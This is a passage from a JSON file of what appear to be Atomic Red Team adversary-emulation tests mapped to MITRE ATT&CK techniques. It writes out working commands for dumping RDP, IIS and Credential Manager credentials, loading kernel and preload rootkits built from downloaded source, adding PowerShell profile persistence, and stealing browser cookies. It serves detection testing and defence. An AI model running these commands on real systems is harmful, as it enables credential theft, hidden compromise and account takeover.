C:\\NPPSpy.txt\"", "cleanup_command": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "Dump svchost.exe to gather RDP credentials", "auto_generated_guid": "d400090a-d8ca-4be0-982e-c70598a23de9", "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n", "supported_platforms": ["windows"], "executor": {"command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n", "cleanup_command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)", "auto_generated_guid": "6c7a4fd3-5b0b-4b30-a93e-39411b25d889", "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "IIS must be installed prior to running the test", "prereq_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}", "get_prereq_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"}], "executor": {"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "name": "powershell", "elevation_required": true}}, {"name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)", "auto_generated_guid": "42510244-5019-48fa-a0e5-66c3b76e6049", "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "IIS must be installed prior to running the test", "prereq_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}", "get_prereq_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"}], "executor": {"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config", "name": "powershell", "elevation_required": true}}, {"name": "Dump Credential Manager using keymgr.dll and rundll32.exe", "auto_generated_guid": "84113186-ed3c-4d0d-8a3c-8980c86c1f4a", "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653", "supported_platforms": ["windows"], "executor": {"command": "rundll32.exe keymgr,KRShowKeyMgr", "name": "powershell"}}]}, "T1006": {"name": "Direct Volume Access", "technique_id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5", "external_id": "T1006", "data_components": ["Command Execution", "Drive Access"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)", "atomic_tests": [{"name": "Read volume boot sector via DOS device path (PowerShell)", "auto_generated_guid": "88f6327e-51ec-4bbf-b2e8-3fea534eab8b", "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```", "supported_platforms": ["windows"], "input_arguments": {"volume": {"description": "Drive letter of the volume to access", "type": "string", "default": "C:"}}, "executor": {"command": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer\n", "name": "powershell", "elevation_required": true}}]}, "T1014": {"name": "Rootkit", "technique_id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b", "external_id": "T1014", "data_components": ["File Modification", "Drive Modification", "Firmware Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)", "atomic_tests": [{"name": "Loadable Kernel Module based Rootkit", "auto_generated_guid": "dfb50072-e45a-4c75-a17e-a484809c8553", "description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "input_arguments": {"rootkit_source_path": {"description": "Path to the rootkit source. Used when prerequisites are fetched.", "type": "path", "default": "PathToAtomicsFolder/T1014/src/Linux"}, "rootkit_path": {"description": "Path To rootkit", "type": "string", "default": "PathToAtomicsFolder/T1014/bin"}, "rootkit_name": {"description": "Module name", "type": "string", "default": "T1014"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n", "prereq_command": "if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp #{rootkit_source_path}/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir #{rootkit_path}\nmv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko\nrm -rf /tmp/T1014\n"}], "executor": {"command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n", "cleanup_command": "sudo rmmod #{rootkit_name}\nsudo rm -rf #{rootkit_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Loadable Kernel Module based Rootkit", "auto_generated_guid": "75483ef8-f10f-444a-bf02-62eb0e48db6f", "description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "input_arguments": {"rootkit_source_path": {"description": "Path to the rootkit source. Used when prerequisites are fetched.", "type": "path", "default": "PathToAtomicsFolder/T1014/src/Linux"}, "rootkit_name": {"description": "Module name", "type": "string", "default": "T1014"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)\n", "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp #{rootkit_source_path}/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n"}], "executor": {"command": "sudo modprobe #{rootkit_name}\n", "cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n", "name": "sh", "elevation_required": true}}, {"name": "dynamic-linker based rootkit (libprocesshider)", "auto_generated_guid": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3", "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n", "supported_platforms": ["linux"], "input_arguments": {"repo": {"description": "Url of the github repo zip", "type": "string", "default": "https://github.com/gianlucaborello/libprocesshider/"}, "rev": {"description": "Revision of the github repo zip", "type": "string", "default": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"}, "library_path": {"description": "Full path of the library to add to ld.so.preload", "type": "string", "default": "/usr/local/lib/libprocesshider.so"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The preload library must exist on disk at specified location (#{library_path})\n", "prereq_command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n"}], "executor": {"command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n", "cleanup_command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n", "name": "sh", "elevation_required": true}}, {"name": "Loadable Kernel Module based Rootkit (Diamorphine)", "auto_generated_guid": "0b996469-48c6-46e2-8155-a17f8b6c2247", "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n", "supported_platforms": ["linux"], "input_arguments": {"repo": {"description": "Url of the diamorphine github repo", "type": "string", "default": "https://github.com/m0nad/Diamorphine/"}, "rev": {"description": "Revision of the github repo zip", "type": "string", "default": "898810523aa2033f582a4a5903ffe453334044f9"}, "rootkit_name": {"description": "Module name", "type": "string", "default": "diamorphine"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n", "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"}], "executor": {"command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n", "cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n", "name": "sh", "elevation_required": true}}]}, "T1546.013": {"name": "PowerShell Profile", "technique_id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3", "external_id": "T1546.013", "data_components": ["File Creation", "Command Execution", "File Modification", "Process Creation"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)", "atomic_tests": [{"name": "Append malicious start-process cmdlet", "auto_generated_guid": "090e5aa5-32b6-473b-a49b-21e843a56896", "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"exe_path": {"description": "Path the malicious executable", "type": "path", "default": "calc.exe"}, "ps_profile": {"description": "Powershell profile to use", "type": "string", "default": "$profile"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Ensure a powershell profile exists for the current user\n", "prereq_command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{ps_profile} -Type File -Force\n"}], "executor": {"command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n", "cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n", "name": "powershell"}}]}, "T1059.007": {"name": "JavaScript", "technique_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d", "external_id": "T1059.007", "data_components": ["Module Load", "Script Execution", "Command Execution", "Process Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).", "atomic_tests": [{"name": "JScript execution to gather local computer information via cscript", "auto_generated_guid": "01d75adf-ca1b-4dd1-ac96-7c9550ad1035", "description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt", "supported_platforms": ["windows"], "input_arguments": {"jscript": {"description": "Path to sample script", "type": "string", "default": "PathToAtomicsFolder\\T1059.007\\src\\sys_info.js"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sample script must exist on disk at specified location (#{jscript})", "prereq_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""}], "executor": {"command": "cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt\n", "cleanup_command": "del %tmp%\\T1059.007.out.txt >nul 2>&1", "name": "command_prompt"}}, {"name": "JScript execution to gather local computer information via wscript", "auto_generated_guid": "0709945e-4fec-4c49-9faf-c3c292a74484", "description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.", "supported_platforms": ["windows"], "input_arguments": {"jscript": {"description": "Path to sample script", "type": "string", "default": "PathToAtomicsFolder\\T1059.007\\src\\sys_info.js"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sample script must exist on disk at specified location (#{jscript})", "prereq_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""}], "executor": {"command": "wscript \"#{jscript}\"\n", "name": "command_prompt"}}]}, "T1123": {"name": "Audio Capture", "technique_id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967", "external_id": "T1123", "data_components": ["Command Execution", "OS API Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.", "atomic_tests": [{"name": "using device audio capture commandlet", "auto_generated_guid": "9c3ad250-b185-4444-b5a9-d69218a10c95", "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n", "supported_platforms": ["windows"], "executor": {"command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "name": "powershell"}}, {"name": "Registry artefact when application use microphone", "auto_generated_guid": "7a21cce2-6ada-4f7c-afd9-e1e9c481e44a", "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f\n", "name": "command_prompt"}}, {"name": "using Quicktime Player", "auto_generated_guid": "c7a0bb71-70ce-4a53-b115-881f241b795b", "description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n", "supported_platforms": ["macos"], "input_arguments": {"filename": {"description": "Location of the script", "type": "path", "default": "PathToAtomicsFolder/T1123/src/T1123.sh"}, "audiofile": {"description": "Location of the recorded audio file", "type": "path", "default": "/tmp/T1123.m4a"}, "duration": {"description": "Length of recording to make in seconds", "type": "integer", "default": 5}}, "executor": {"command": "sh #{filename} #{audiofile} #{duration}\n", "cleanup_command": "if test -w #{audiofile}; then\n  rm #{audiofile}\nfi\n", "name": "sh"}}]}, "T1133": {"name": "External Remote Services", "technique_id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d", "external_id": "T1133", "data_components": ["Logon Session Metadata", "Application Log Content", "Network Traffic Content", "Network Traffic Flow", "Network Connection Creation"], "kill_chain_phases": ["persistence", "initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)", "atomic_tests": [{"name": "Running Chrome VPN Extensions via the Registry 2 vpn extension", "auto_generated_guid": "4c8db261-a58b-42a6-a866-0a294deedde4", "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n", "supported_platforms": ["windows"], "input_arguments": {"chrome_url": {"description": "chrome installer download URL", "type": "url", "default": "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe"}, "extension_id": {"description": "chrome extension id", "type": "string", "default": "\"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Chrome must be installed\n", "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" #{chrome_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" /S\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n", "cleanup_command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\nRemove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}\n"}}]}, "T1539": {"name": "Steal Web Session Cookie", "technique_id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff", "external_id": "T1539", "data_components": ["Process Access", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.", "atomic_tests": [{"name": "Steal Firefox Cookies (Windows)", "auto_generated_guid": "4b437357-f4e9-4c84-9fa6-9bcee6f826aa", "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n", "supported_platforms": ["windows"], "input_arguments": {"sqlite3_path": {"description": "Path to sqlite3", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"}, "output_file": {"description": "Filepath to output cookies", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sqlite3 must exist at (#{sqlite3_path})\n", "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"}], "executor": {"command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n", "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n", "name": "powershell", "elevation_required": false}}, {"name": "Steal Chrome Cookies (Windows)", "auto_generated_guid": "26a6b840-4943-4965-8df5-ef1f9a282440", "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n", "supported_platforms": ["windows"], "input_arguments": {"cookie_db": {"description": "Filepath for Chrome cookies database", "type": "string", "default": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"}, "sqlite3_path": {"description": "Path to sqlite3", 